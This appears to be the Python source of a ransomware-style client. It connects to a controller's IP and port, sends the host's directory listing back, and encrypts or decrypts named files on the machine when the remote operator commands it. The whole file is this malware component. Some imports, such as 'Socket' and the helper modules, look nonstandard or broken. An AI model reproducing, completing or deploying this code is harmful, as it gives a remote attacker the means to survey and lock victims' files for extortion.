from socket import Socket
import cryptography
import location
import os


class Client(object):
    def __init__(self, ip, port):
        self.client_soc = Socket()
        self.client_soc.connect((ip, port))

    def send(self, data):
        self.client_soc.send(data)

    def receive(self):
        return self.client_soc.recv(1024)

    # sends the compute's directories
    def send_dirs(self):
        self.client_soc.send(location.get_dirs())

    # encrypts file on the computer by his name and a given key
    def encrypt(self, exported_key, file_name):
        if os.path.exists(file_name):
            cryptography.encrypt(exported_key, file_name)

    # decrypts file on the computer by his name and a given key
    def decrypt(self, exported_key, file_name):
        if os.path.exists(file_name):
            cryptography.decrypt(exported_key, file_name)

    # splits the given command to list with 3 elements:
    # [first word, second word, the rest of the command]
    def split_command(self, command):
        splited_list = []
        words = command.split(" ")
        if len(words) == 1:
            return words
        splited_list.append(words[0])
        splited_list.append(words[1])
        splited_list.append(" ".join(words[2:]))
        return splited_list

    # gets a command  by the protocol and executes the right method
    """protocol:
    encrypt/decrypt key file
    dirs
    """
    def protocol(self, command):
        splited = self.split_command(command)
        if splited[0] == 'encrypt':
            self.encrypt(splited[1], splited[2])
        elif splited[0] == 'decrypt':
            self.decrypt(splited[1], splited[2])
        elif splited[0] == 'dirs':
            self.send_dirs()

    def run(self):
        while "Encrypt.io":
            command = self.receive()
            self.protocol(command)






